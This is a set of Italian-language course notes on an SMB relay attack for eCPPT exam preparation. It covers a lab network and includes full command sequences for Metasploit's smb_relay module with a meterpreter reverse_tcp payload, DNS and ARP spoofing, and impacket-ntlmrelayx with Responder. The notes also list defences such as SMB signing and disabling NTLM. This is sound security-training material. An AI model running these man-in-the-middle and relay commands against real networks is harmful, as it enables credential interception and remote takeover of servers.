# 021 — SMB Relay Attack (Network Penetration Testing)

> **Modulo:** Network Penetration Testing · **Video:** 21/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [021_SMB_Relay_Attack.mp4.txt](021_SMB_Relay_Attack.mp4.txt) · [021_SMB_Relay_Attack.mp4.srt](021_SMB_Relay_Attack.mp4.srt)

## Concetti chiave

- **SMB Relay** = MITM su traffico SMB: l'attaccante intercetta la negoziazione NTLM del client, la **rilancia** verso un altro server SMB autenticandosi al posto dell'utente.
- Catena attacco: **ARP spoofing** + **DNS spoofing** → vittima si connette al rogue SMB → cattura/relay hash NTLM → **Meterpreter session** sul target.
- Nessun cracking necessario: si **relaya** l'hash live invece di decifrarlo.
- Requisito target: **SMB signing disabled** (default su molti Windows fino a Server 2019 non-DC).
- Pre-req attaccante: posizione **on-path** nella stessa LAN del client.

## Spiegazione approfondita

### Architettura attacco (lab sportsfoo.com)
```
[Client Win7 172.16.5.5] ←→ [Gateway 172.16.5.1] ←→ [File Server / target 172.16.5.10]
              ↑
       [Kali 172.16.5.11]   ← attacker
```

### Step 1 — Configura Metasploit SMB relay module
```bash
sudo msfconsole
msf6 > use exploit/windows/smb/smb_relay   # use 0 dopo search smb_relay
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set SRVHOST  172.16.5.11           # IP Kali (rogue SMB server)
msf6 > set LHOST    172.16.5.11           # IP Kali (callback)
msf6 > set SMBHOST  172.16.5.10           # target a cui rilanciare l'hash
msf6 > show options
msf6 > exploit -j
```
- `SRVHOST` = IP Kali su cui gira il fake SMB server.
- `SMBHOST` = SERVER DOVE RILANCIARE l'autenticazione (file server / DC).
- `LHOST/LPORT` = callback meterpreter.

### Step 2 — DNS spoofing con `dnsspoof`
File hosts fake che reindirizza tutti i subdomain di `sportsfoo.com` al Kali:
```bash
echo "172.16.5.11 *.sportsfoo.com" > dns
sudo dnsspoof -i eth1 -f dns
```
Ora ogni query DNS per `fileserver.sportsfoo.com`, `dc.sportsfoo.com`, ecc. riceve risposta = IP Kali → la vittima parlerà SMB con noi.

### Step 3 — ARP spoofing bidirezionale
Necessario per stare in mezzo tra vittima ↔ gateway.

Abilita IP forwarding:
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Due terminali, due `arpspoof`:
```bash
# Terminale A — convince la vittima che noi siamo il gateway
sudo arpspoof -i eth1 -t 172.16.5.5 172.16.5.1

# Terminale B — convince il gateway che noi siamo la vittima
sudo arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

### Step 4 — Aspetta che la vittima inneschi una connessione SMB
Trigger comuni:
- Mapped network drive
- Login script
- File explorer che apre `\\fileserver\share`
- Office che apre file con icone da SMB share
- WPAD / NetBIOS NS poisoning (vedi Responder)

`dnsspoof` mostra la risposta forgiata:
```
fileserver.sportsfoo.com → 172.16.5.11
```

### Step 5 — Meterpreter su SMBHOST
Quando il client autentica al fake SMB, Metasploit:
1. Cattura NTLM challenge-response.
2. **Rilancia** la sessione SMB autenticata verso `SMBHOST` (172.16.5.10).
3. Esegue payload → sessione Meterpreter sul file server.

```
msf6 > sessions -l
msf6 > sessions 1
meterpreter > sysinfo
meterpreter > getuid
```

### Difese contro SMB relay
- **SMB signing required** sui server (default sui DC, da abilitare ovunque).
- **LDAP signing + channel binding**.
- **Disabilitare NTLM**, usare Kerberos.
- **SMBv1 disabled**.
- Segmentazione di rete (no broadcast tra workstation/server).

### Alternativa moderna: `ntlmrelayx.py` (impacket)
Nota extra: il tool standard nel 2024 per relay è `impacket-ntlmrelayx`:
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
# combinato con responder per catturare NTLM da broadcast (LLMNR/NBT-NS)
sudo responder -I eth1 -A     # Analyze mode (no poison)
```

## Comandi & strumenti

| Tool | Scopo | Esempio |
|---|---|---|
| `msfconsole` modulo `exploit/windows/smb/smb_relay` | Relay SMB → Meterpreter | `SRVHOST`, `SMBHOST`, `LHOST` |
| `dnsspoof -i <iface> -f <hostsfile>` | DNS poisoning su LAN | hosts file con `IP host` |
| `arpspoof -i <iface> -t <victim> <gateway>` | ARP poisoning vittima | + reverse direction |
| `echo 1 > /proc/sys/net/ipv4/ip_forward` | Enable IP forward | obbligatorio per MITM transparente |
| `impacket-ntlmrelayx -tf <targets> -smb2support` | Relay moderno (impacket) | combinabile con responder |
| `responder -I <iface>` | LLMNR/NBT-NS poison | cattura hash NTLMv2 |
| `impacket-secretsdump` | Dump SAM/LSA via SMB | usabile post-relay |

## Esempi pratici

### Flow completo lab Metasploit
```bash
# Terminale 1: Metasploit
sudo msfconsole
msf6 > use exploit/windows/smb/smb_relay
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set SRVHOST 172.16.5.11
msf6 > set LHOST   172.16.5.11
msf6 > set SMBHOST 172.16.5.10
msf6 > exploit -j

# Terminale 2: DNS spoof
echo "172.16.5.11 *.sportsfoo.com" > dns
sudo dnsspoof -i eth1 -f dns

# Terminale 3: IP forward + ARP victim
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i eth1 -t 172.16.5.5 172.16.5.1

# Terminale 4: ARP gateway
sudo arpspoof -i eth1 -t 172.16.5.1 172.16.5.5

# Quando la vittima accede a un share:
msf6 > sessions -l
msf6 > sessions -i 1
meterpreter > sysinfo     # ← target file server compromesso
```

### Flow moderno con impacket + responder
```bash
# Disable SMB/HTTP nel responder per non interferire con relay
sudo nano /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

# Avvia ntlmrelayx (target file system)
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# In parallelo: responder per catturare hash da LLMNR/NBT-NS
sudo responder -I eth0 -wd

# Usa relay socks per accesso post-auth
proxychains impacket-smbexec administrator@<target>
```

## Punti d'attenzione per l'esame eCPPT

- **Pre-requisito CHIAVE**: il target server deve avere **SMB signing disabled** (o `not required`). Sui DC è default `required`, sui file server no.
- **Non serve crackare** l'hash: si rilancia live.
- **Stessa LAN**: l'attaccante deve essere on-path (ARP/DNS spoof) o ricevere autenticazione (responder).
- Tool Metasploit: **`exploit/windows/smb/smb_relay`** con opzioni `SRVHOST`, `SMBHOST`, `LHOST`.
- Tool standard moderno: **`impacket-ntlmrelayx`** + **`responder`**.
- **DNS spoofing**: trick per redirigere `*.dominio` al Kali.
- **ARP spoofing bidirezionale**: 2 `arpspoof` (victim→gateway e gateway→victim).
- **IP forwarding** (`echo 1 > /proc/sys/net/ipv4/ip_forward`) obbligatorio per MITM transparente.
- Differenza con **Pass-the-Hash**: SMB relay usa l'hash live senza estrarlo; PtH usa un hash già rubato.
- Difese: **SMB signing required**, **LDAP channel binding**, **NTLM disabled**, segmentazione.
- Responder + relay è la **catena pre-AD** più comune del red team.

## Collegamenti con altri video

- Precedente: [[020_Linux_Service_Enumeration.mp4]]
- Prossimo: [[022_MSSQL_DB_User_Impersonation_to_RCE.mp4]]
- Enum SMB di base: [[018_SMB___NetBIOS_Enumeration.mp4]]
- Hash dumping post-access: [[024_Dumping___Cracking_NTLM_Hashes.mp4]]
- Pivoting con SOCKS proxy: [[025_Windows_Post-Exploitation_Lab.mp4]]
- AD Pass-the-Hash (variante con hash già rubato): modulo Active Directory.
